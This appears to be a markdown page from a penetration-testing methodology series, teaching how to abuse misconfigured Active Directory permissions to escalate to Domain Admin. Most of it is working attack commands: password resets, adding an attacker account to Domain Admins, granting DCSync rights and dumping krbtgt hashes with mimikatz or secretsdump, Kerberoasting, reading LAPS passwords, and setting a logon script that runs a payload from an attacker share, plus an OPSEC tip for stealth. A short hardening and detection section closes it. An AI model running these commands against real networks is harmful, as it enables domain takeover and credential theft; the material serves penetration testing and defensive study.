@@ -1,0 +1,299 @@
+---
+title: "Part 1: Exploiting Permission Delegation"
+description: "Abusing misconfigured ACLs and delegated permissions to escalate privileges in Active Directory — GenericAll, WriteDACL, WriteOwner, ForceChangePassword, and more."
+category: Methodology
+subcategory: Active Directory Attack
+order: 1
+tags: ["active-directory", "pentesting", "acl-abuse", "privilege-escalation"]
+updated: 2026-04-11
+---
+
+# Part 1: Exploiting Permission Delegation
+
+Every object in Active Directory — users, groups, computers, OUs — has an Access Control List (ACL) that defines who can do what. When administrators delegate permissions carelessly (e.g., letting a helpdesk group reset passwords on admin accounts, or giving IT staff GenericWrite on the Domain Admins group), attackers can chain these misconfigurations to escalate from a low-privilege user to Domain Admin.
+
+**BloodHound** is the essential tool here. It maps these relationships as a graph and finds the shortest attack path.
+
+---
+
+## Finding Misconfigured ACLs
+
+### BloodHound
+
+Upload your collection data and run built-in queries:
+
+- *Shortest Path to Domain Admins from Owned Principals*
+- *Find Principals with DCSync Rights*
+- *Shortest Path from Kerberoastable Users*
+
+### PowerView
+
+```powershell
+# Find all interesting ACLs in the domain
+Find-InterestingDomainAcl -ResolveGUIDs
+
+# Check specific object ACL
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {
+  $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
+}
+
+# Who can reset passwords?
+Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | ? {
+  $_.ObjectAceType -match "User-Force-Change-Password"
+}
+```
+
+---
+
+## Attack: GenericAll
+
+**Severity:** 🔴 Critical
+
+**What it means:** Full control over the target object. You can do *anything* — reset passwords, modify group membership, set SPNs, write attributes.
+
+### GenericAll on a User
+
+```powershell
+# Option 1: Reset their password
+net user targetuser 'NewP@ssw0rd!' /domain
+
+# Option 2: Set an SPN → Kerberoast
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+Rubeus.exe kerberoast /user:targetuser /outfile:hash.txt
+# Crack with hashcat -m 13100
+# Clean up the SPN after
+Set-DomainObject -Identity targetuser -Clear serviceprincipalname
+
+# Option 3: Disable Kerberos pre-auth → AS-REP Roast
+Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
+```
+
+### GenericAll on a Group
+
+```powershell
+# Add yourself directly
+Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser
+
+# Verify
+Get-DomainGroupMember -Identity "Domain Admins"
+```
+
+### GenericAll on a Computer
+
+```powershell
+# Configure RBCD to yourself (see Part 3 for full RBCD chain)
+$sid = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
+$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
+$bytes = New-Object byte[] ($sd.BinaryLength)
+$sd.GetBinaryForm($bytes, 0)
+Set-DomainObject -Identity TARGETPC -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
+```
+
+---
+
+## Attack: GenericWrite
+
+**Severity:** 🔴 Critical
+
+**What it means:** Write access to any non-protected attribute on the object. Slightly less than GenericAll, but still exploitable.
+
+### On a User
+
+```powershell
+# Set SPN for Kerberoasting (targeted Kerberoast)
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/fake'}
+
+# Set logon script (code execution next time they log in)
+Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\payload.exe'}
+```
+
+### On a Computer
+
+```powershell
+# Write msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD attack
+# (same as GenericAll on computer — see above)
+```
+
+---
+
+## Attack: WriteDACL
+
+**Severity:** 🔴 Critical
+
+**What it means:** You can modify the ACL itself. Grant yourself GenericAll, then do whatever you want.
+
+```powershell
+# Step 1: Grant yourself GenericAll on the target
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
+  -PrincipalIdentity attackeruser -Rights All
+
+# Step 2: Now abuse GenericAll (add yourself to the group)
+Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser
+```
+
+### WriteDACL on the Domain Object
+
+This is especially dangerous — you can grant yourself **DCSync** rights:
+
+```powershell
+# Grant DCSync rights
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
+  -PrincipalIdentity attackeruser \
+  -Rights DCSync
+
+# Now DCSync
+mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"
+# or
+secretsdump.py domain.local/attackeruser:pass@dc01.domain.local
+```
+
+---
+
+## Attack: WriteOwner
+
+**Severity:** 🟠 High
+
+**What it means:** Change the owner of the object. The owner implicitly has WriteDACL.
+
+**Chain:** WriteOwner → WriteDACL → GenericAll
+
+```powershell
+# Step 1: Take ownership
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attackeruser
+
+# Step 2: Grant yourself full rights (WriteDACL is now implicit)
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
+  -PrincipalIdentity attackeruser -Rights All
+
+# Step 3: Add yourself
+Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser
+```
+
+---
+
+## Attack: ForceChangePassword
+
+**Severity:** 🟠 High
+
+**What it means:** Reset a user's password without knowing the current one. This is a standalone right — it doesn't require GenericAll.
+
+```powershell
+# PowerView
+Set-DomainUserPassword -Identity targetuser \
+  -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force) -Verbose
+
+# net command
+net user targetuser 'NewP@ss123!' /domain
+
+# Impacket (from Linux)
+changepasswd.py domain.local/targetuser:'oldpass'@dc01 -newpass 'NewP@ss123!'
+```
+
+> ⚠️ **OPSEC Warning:** Resetting passwords is noisy — the user will notice they can't log in. Prefer Kerberoasting (set SPN) or delegation abuse when stealth matters.
+
+---
+
+## Attack: AddMember / Self
+
+**Severity:** 🟠 High
+
+**What it means:** Add any user (or yourself, with `AddSelf`) to a group.
+
+```powershell
+# Add yourself to a privileged group
+Add-DomainGroupMember -Identity "Server Operators" -Members attackeruser
+Add-DomainGroupMember -Identity "Backup Operators" -Members attackeruser
+
+# Verify
+Get-DomainGroupMember -Identity "Server Operators" | select MemberName
+```
+
+### Interesting Groups to Target
+
+| Group | Why It Matters |
+|---|---|
+| **Domain Admins** | Full domain control |
+| **Enterprise Admins** | Full forest control |
+| **Server Operators** | Log on to DCs, manage services |
+| **Backup Operators** | Read any file, backup SAM/NTDS |
+| **Account Operators** | Manage non-admin accounts and groups |
+| **DNS Admins** | DLL injection on DNS service (runs as SYSTEM on DC) |
+| **Group Policy Creator Owners** | Create new GPOs |
+
+---
+
+## Attack: AllExtendedRights
+
+**Severity:** 🟠 High
+
+**What it means:** Includes both `ForceChangePassword` and the ability to read LAPS passwords.
+
+```powershell
+# Read LAPS password
+Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd | select ms-Mcs-AdmPwd
+
+# Or via CrackMapExec
+crackmapexec ldap dc01 -u user -p pass -M laps
+```
+
+---
+
+## Chaining ACL Attacks
+
+In practice, ACL abuse involves chaining multiple hops. Example path BloodHound might reveal:
+
+```
+You (jsmith)
+  → GenericWrite on svc_backup
+    → Set SPN → Kerberoast → crack password
+      → svc_backup is member of Backup Operators
+        → Dump NTDS.dit → extract all hashes
+          → Domain Admin
+```
+
+Always check **BloodHound's transitive paths** — the direct ACL might not look exploitable, but a 3-hop chain might exist.
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+- **Run BloodHound defensively** — use it before attackers do. Clean up dangerous edges.
+- **AdminSDHolder** — ensure protected objects have correct ACLs. SDProp re-applies AdminSDHolder ACLs every 60 minutes.
+- **Least privilege** — audit all delegated permissions with `Find-InterestingDomainAcl`.
+- **Remove stale ACEs** — when employees change roles, their old permissions often remain.
+
+### Detection (Event IDs)
+
+| Event ID | What It Catches |
+|---|---|
+| **4662** | Directory service object access (ACL use) |
+| **5136** | Directory service object modification |
+| **4738** | User account changed |
+| **4728 / 4732 / 4756** | User added to security group (global / local / universal) |
+| **4724** | Password reset attempt |
+
+### PowerShell Monitoring
+
+```powershell
+# Audit who has dangerous permissions on Domain Admins
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {
+  ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite") -and
+  ($_.SecurityIdentifier -notmatch "S-1-5-21.*-512")  # Exclude DA SID itself
+} | select SecurityIdentifier, ActiveDirectoryRights
+```
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 2: Exploiting Kerberos Delegation](/docs/methodology/active-directory-attack/02-kerberos-delegation)** — unconstrained, constrained, RBCD, Kerberoasting, and AS-REP Roasting.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
